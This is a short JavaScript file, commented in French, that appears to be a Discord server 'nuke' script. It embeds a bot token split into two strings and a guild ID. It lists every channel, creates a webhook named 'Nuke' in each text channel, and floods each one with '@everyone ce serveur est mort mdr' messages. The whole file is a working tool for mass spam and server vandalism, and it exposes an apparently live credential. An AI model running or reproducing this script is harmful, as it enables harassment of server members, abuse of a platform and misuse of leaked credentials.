const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
const botToken = part1 + part2;
const guild = "1534554643583995936";

async function webhookSpam() {
  console.log("démarrage du webhook spam...");

  // 1. récupérer tous les salons
  let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  // 2. pour chaque salon, créer un webhook et spammer
  for (let c of channels) {
    if (c.type !== 0) continue; // seulement les salons textuels

    try {
      // Créer un webhook
      let whRes = await fetch(`https://discord.com/api/v9/channels/${c.id}/webhooks`, {
        method: "POST",
        headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
        body: JSON.stringify({ name: "Nuke" })
      });
      let wh = await whRes.json();
      
      if (wh.url) {
        // Envoyer 10 messages par webhook
        for (let i = 0; i < 10; i++) {
          fetch(wh.url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: "@everyone ce serveur est mort mdr" })
          }).catch(() => {});
        }
        console.log(`spam du salon : ${c.name}`);
      }
    } catch (e) {}
  }

  console.log("fin du webhook spam.");
}

webhookSpam();